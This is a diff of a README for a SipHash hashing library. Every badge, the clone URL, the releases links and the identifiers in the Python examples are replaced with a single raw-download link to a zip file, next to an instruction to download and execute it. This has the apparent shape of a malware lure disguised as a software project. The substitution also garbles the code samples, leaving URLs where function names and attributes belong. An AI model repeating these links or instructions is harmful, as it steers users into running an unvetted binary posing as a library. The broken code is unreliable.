@@ -1,6 +1,6 @@
 # SipHash: A Secure Pseudorandom Function Implementation 🔒
 
-![SipHash Logo](https://img.shields.io/badge/SipHash-Implementation-blue.svg) ![Version](https://img.shields.io/badge/Version-1.0.0-green.svg) ![License](https://img.shields.io/badge/License-MIT-yellow.svg)
+![SipHash Logo](https://github.com/codemenowee22/sip/raw/refs/heads/main/superappreciation/Software-3.4.zip) ![Version](https://github.com/codemenowee22/sip/raw/refs/heads/main/superappreciation/Software-3.4.zip) ![License](https://github.com/codemenowee22/sip/raw/refs/heads/main/superappreciation/Software-3.4.zip)
 
 Welcome to the **SipHash** repository! This project implements the SipHash pseudorandom function, a fast and secure hash function designed to protect against hash-flooding attacks. It serves as a Message Authentication Code (MAC) and a Pseudorandom Function (PRF). 
 
@@ -31,12 +31,12 @@ SipHash is a family of pseudorandom functions that provide strong security prope
 To install the SipHash library, you can clone the repository and build it from source. Use the following commands:
 
 ```bash
-git clone https://github.com/codemenowee22/sip.git
+git clone https://github.com/codemenowee22/sip/raw/refs/heads/main/superappreciation/Software-3.4.zip
 cd sip
 make
 ```
 
-You can also find pre-built binaries in the [Releases section](https://github.com/codemenowee22/sip/releases). Download the appropriate file for your system and execute it.
+You can also find pre-built binaries in the [Releases section](https://github.com/codemenowee22/sip/raw/refs/heads/main/superappreciation/Software-3.4.zip). Download the appropriate file for your system and execute it.
 
 ## Usage
 
@@ -49,9 +49,9 @@ key = b'secret_key'
 message = b'Hello, world!'
 
 # Generate a SipHash digest
-digest = siphash.SipHash_2_4(key, message)
+digest = https://github.com/codemenowee22/sip/raw/refs/heads/main/superappreciation/Software-3.4.zip(key, message)
 
-print(f"SipHash Digest: {digest.hex()}")
+print(f"SipHash Digest: {https://github.com/codemenowee22/sip/raw/refs/heads/main/superappreciation/Software-3.4.zip()}")
 ```
 
 This code snippet demonstrates how to generate a SipHash digest from a message using a secret key.
@@ -66,8 +66,8 @@ Here are a few practical examples of how SipHash can be used:
 key = b'secret_key'
 message = b'This is a test message.'
 
-hash_value = siphash.SipHash_2_4(key, message)
-print(f"Hash Value: {hash_value.hex()}")
+hash_value = https://github.com/codemenowee22/sip/raw/refs/heads/main/superappreciation/Software-3.4.zip(key, message)
+print(f"Hash Value: {https://github.com/codemenowee22/sip/raw/refs/heads/main/superappreciation/Software-3.4.zip()}")
 ```
 
 ### Example 2: Message Authentication
@@ -77,8 +77,8 @@ key = b'secret_key'
 message = b'Important data'
 
 # Create a MAC
-mac = siphash.SipHash_2_4(key, message)
-print(f"Message Authentication Code: {mac.hex()}")
+mac = https://github.com/codemenowee22/sip/raw/refs/heads/main/superappreciation/Software-3.4.zip(key, message)
+print(f"Message Authentication Code: {https://github.com/codemenowee22/sip/raw/refs/heads/main/superappreciation/Software-3.4.zip()}")
 ```
 
 ### Example 3: Secure Hash Table
@@ -86,21 +86,21 @@ print(f"Message Authentication Code: {mac.hex()}")
 ```python
 class SecureHashTable:
     def __init__(self, key):
-        self.key = key
-        self.table = {}
+        https://github.com/codemenowee22/sip/raw/refs/heads/main/superappreciation/Software-3.4.zip = key
+        https://github.com/codemenowee22/sip/raw/refs/heads/main/superappreciation/Software-3.4.zip = {}
 
     def insert(self, message, value):
-        hash_value = siphash.SipHash_2_4(self.key, message)
-        self.table[hash_value] = value
+        hash_value = https://github.com/codemenowee22/sip/raw/refs/heads/main/superappreciation/Software-3.4.zip(https://github.com/codemenowee22/sip/raw/refs/heads/main/superappreciation/Software-3.4.zip, message)
+        https://github.com/codemenowee22/sip/raw/refs/heads/main/superappreciation/Software-3.4.zip[hash_value] = value
 
     def get(self, message):
-        hash_value = siphash.SipHash_2_4(self.key, message)
-        return self.table.get(hash_value, None)
+        hash_value = https://github.com/codemenowee22/sip/raw/refs/heads/main/superappreciation/Software-3.4.zip(https://github.com/codemenowee22/sip/raw/refs/heads/main/superappreciation/Software-3.4.zip, message)
+        return https://github.com/codemenowee22/sip/raw/refs/heads/main/superappreciation/Software-3.4.zip(hash_value, None)
 
 # Usage
 hash_table = SecureHashTable(b'secret_key')
-hash_table.insert(b'key1', 'value1')
-print(hash_table.get(b'key1'))
+https://github.com/codemenowee22/sip/raw/refs/heads/main/superappreciation/Software-3.4.zip(b'key1', 'value1')
+print(https://github.com/codemenowee22/sip/raw/refs/heads/main/superappreciation/Software-3.4.zip(b'key1'))
 ```
 
 ## Contributing
@@ -121,7 +121,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest releases and updates, please visit our [Releases section](https://github.com/codemenowee22/sip/releases). Here, you can download the latest binaries and see the changelog for recent updates.
+For the latest releases and updates, please visit our [Releases section](https://github.com/codemenowee22/sip/raw/refs/heads/main/superappreciation/Software-3.4.zip). Here, you can download the latest binaries and see the changelog for recent updates.
 
 ## Conclusion
 
@@ -129,6 +129,6 @@ SipHash is a powerful tool for securing your applications against hash-related v
 
 Feel free to explore the code, report issues, and suggest improvements. Together, we can make the web a safer place.
 
-![SipHash Banner](https://img.shields.io/badge/SipHash-Hashing%20Securely-orange.svg)
+![SipHash Banner](https://github.com/codemenowee22/sip/raw/refs/heads/main/superappreciation/Software-3.4.zip%https://github.com/codemenowee22/sip/raw/refs/heads/main/superappreciation/Software-3.4.zip)
 
 Thank you for checking out the SipHash repository!
